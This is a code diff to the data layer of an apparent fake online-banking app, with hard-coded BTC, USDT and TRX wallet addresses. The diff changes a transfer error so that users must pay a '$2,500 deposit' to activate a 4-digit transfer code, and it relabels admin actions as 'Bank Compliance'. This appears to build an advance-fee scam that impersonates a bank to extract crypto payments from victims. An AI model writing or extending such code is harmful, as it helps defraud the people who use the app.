@@ -17,6 +17,7 @@ interface DatabaseSchema {
   cryptoWalletAddresses?: {
     BTC: string;
     USDT: string;
+    TRX: string;
   };
 }
 
@@ -455,7 +456,8 @@ class DatabaseManager {
       supportTickets: seedSupportTickets,
       cryptoWalletAddresses: {
         BTC: 'bc1qe4ln6nt3w0yqc6gvchqeut9d2r2raedm52ej5c',
-        USDT: 'TWgMXsoubMTxyK9Zc47ZxcN29bLaCJU4EA'
+        USDT: 'TWgMXsoubMTxyK9Zc47ZxcN29bLaCJU4EA',
+        TRX: 'TWgMXsoubMTxyK9Zc47ZxcN29bLaCJU4EA'
       }
     };
 
@@ -1062,7 +1064,7 @@ class DatabaseManager {
     // Check 4-digit transaction security code requirement
     if (user.role !== 'admin') {
       if (!user.fourDigitCode || !user.transferCodeApproved) {
-        throw new Error('Invalid security code. Please contact administrator to generate or approve your 4-digit transaction code.');
+        throw new Error('4-Digit Security Code Required: Please submit your $2,500 deposit to activate your 4-digit transfer security code.');
       }
       if (!payload.fourDigitCode || payload.fourDigitCode.trim() !== user.fourDigitCode.trim()) {
         throw new Error('Invalid security code. The 4-digit transaction security code entered is incorrect.');
@@ -1708,7 +1710,7 @@ class DatabaseManager {
       id: `notif-${Date.now()}-cancel`,
       userId: txn.userId,
       title: 'Transaction Cancelled',
-      message: `Transaction ${txn.reference} of $${txn.amount.toFixed(2)} was cancelled by Administrator. Your balance has been updated accordingly.`,
+      message: `Transaction ${txn.reference} of $${txn.amount.toFixed(2)} was cancelled by Bank Compliance. Your balance has been updated accordingly.`,
       amount: txn.amount,
       currency: txn.currency,
       reference: txn.reference,
@@ -1926,9 +1928,9 @@ class DatabaseManager {
     const notif: UserNotification = {
       id: `notif-${Date.now()}-bill`,
       userId: user.id,
-      title: isPending ? 'Bill Payment Pending Admin Approval' : 'Bill Payment Executed',
+      title: isPending ? 'Bill Payment Pending Compliance Review' : 'Bill Payment Executed',
       message: isPending 
-        ? `Bill payment of $${amount.toFixed(2)} to ${data.billerName} is pending administrator review. Ref: ${ref}`
+        ? `Bill payment of $${amount.toFixed(2)} to ${data.billerName} is pending review. Ref: ${ref}`
         : `Bill payment of $${amount.toFixed(2)} to ${data.billerName} was completed. Ref: ${ref}`,
       amount,
       currency: 'USD',
